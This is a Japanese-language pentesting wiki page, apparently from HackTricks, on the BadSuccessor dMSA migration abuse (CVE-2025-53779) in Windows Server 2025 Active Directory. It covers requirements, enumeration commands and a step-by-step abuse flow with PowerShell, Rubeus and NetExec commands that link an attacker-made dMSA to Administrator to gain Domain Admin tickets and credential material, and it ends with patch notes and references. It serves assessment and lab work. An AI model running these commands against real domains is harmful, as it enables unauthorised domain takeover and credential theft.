# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## 概要

**BadSuccessor** は、**Windows Server 2025** で導入された **delegated Managed Service Account** (**dMSA**) の migration workflow を悪用します。dMSA は **`msDS-ManagedAccountPrecededByLink`** を通じて legacy account にリンクでき、**`msDS-DelegatedMSAState`** に保存された migration state を通じて移行できます。攻撃者が writable OU に dMSA を作成し、これらの attributes を制御できる場合、KDC はリンクされた account の **authorization context** を持つ、攻撃者が制御する dMSA の tickets を発行できます。<sup>[[2]](#references)</sup>

実際には、OU に対する delegated rights しか持たない low-privileged user でも、新しい dMSA を作成して `Administrator` を指すように設定し、migration state を完了させることで、**Domain Admins** などの privileged groups を含む PAC を持つ TGT を取得できます。<sup>[[2]](#references)</sup>

## 重要な dMSA migration の詳細

- dMSA は **Windows Server 2025** の feature です。
- `Start-ADServiceAccountMigration` は migration を **started** state に設定します。
- `Complete-ADServiceAccountMigration` は migration を **completed** state に設定します。
- `msDS-DelegatedMSAState = 1` は migration started を意味します。
- `msDS-DelegatedMSAState = 2` は migration completed を意味します。
- 正規の migration 中、dMSA は superseded account を透過的に置き換えることを意図されているため、KDC/LSA は以前の account がすでに持っていた access を保持します。<sup>[[3]](#references)</sup>

Microsoft Learn は、migration 中に original account が dMSA に紐付けられ、dMSA が old account で access できた対象に access することを意図されている点にも触れています。<sup>[[3]](#references)</sup> これが、BadSuccessor が悪用する security assumption です。<sup>[[2]](#references)</sup>

## 要件

1. **dMSA が存在する** domain。つまり、AD 側に **Windows Server 2025** support が存在していること。
2. 攻撃者が、いずれかの OU に `msDS-DelegatedManagedServiceAccount` objects を **create** できること、またはそこで同等の広範な child-object creation rights を持っていること。
3. 攻撃者が、関連する dMSA attributes を **write** できること、または作成した dMSA を完全に control できること。
4. 攻撃者が、domain-joined context から、または LDAP/Kerberos に到達できる tunnel から Kerberos tickets を request できること。<sup>[[2]](#references)</sup>

### 実践的な確認

最も明確な operator signal は、domain/forest level を確認し、環境がすでに新しい Server 2025 stack を使用していることを確認することです:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
`Windows2025Domain` や `Windows2025Forest` などの値が見つかった場合は、**BadSuccessor / dMSA migration abuse** を優先的に確認してください。

公開ツールを使用して、dMSA 作成の権限が委任された書き込み可能な OU を列挙することもできます:<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Abuse flow

1. create-child rights を委任されている OU に dMSA を作成します。
2. **`msDS-ManagedAccountPrecededByLink`** を、`CN=Administrator,CN=Users,DC=corp,DC=local` などの privileged target の DN に設定します。
3. **`msDS-DelegatedMSAState`** を `2` に設定し、migration が完了したことを示します。
4. 新しい dMSA の TGT を要求し、返された ticket を使用して privileged services にアクセスします。<sup>[[2]](#references)</sup>

PowerShell example:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Ticket request / 運用ツールの例:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## なぜこれは privilege escalation 以上のものなのか

正規の migration 中、Windows は cutover 前に以前の account に対して発行された tickets を新しい dMSA でも処理する必要があります。そのため、dMSA 関連の ticket material には、**`KERB-DMSA-KEY-PACKAGE`** flow 内で **current** および **previous** keys が含まれることがあります。<sup>[[2]](#references)</sup>

攻撃者が制御する fake migration では、この動作によって BadSuccessor は次のようなものになります。<sup>[[2]](#references)</sup>

- PAC 内の privileged group SID を継承することによる **privilege escalation**。
- previous-key handling により、脆弱な workflow で predecessor の RC4/NT hash と同等の material が露出する可能性があるため、**credential material exposure**。

このため、この technique は直接的な domain takeover と、pass-the-hash やより広範な credential compromise などの follow-on operations の両方に利用できます。

## patch status に関する注意

元の BadSuccessor の動作は、**単なる 2025 年の理論上の preview issue ではありません**。Microsoft はこれに **CVE-2025-53779** を割り当て、**2025 年 8 月**に security update を公開しました。<sup>[[4]](#references)</sup> 次の環境や目的のために、この attack を documentation に残してください。

- **labs / CTFs / assume-breach exercises**
- **unpatched Windows Server 2025 environments**
- **assessments 中の OU delegations および dMSA exposure の validation**

dMSA が存在するというだけで Windows Server 2025 domain が vulnerable だと判断しないでください。patch level を確認し、慎重に test してください。

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor dMSA abuse to Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
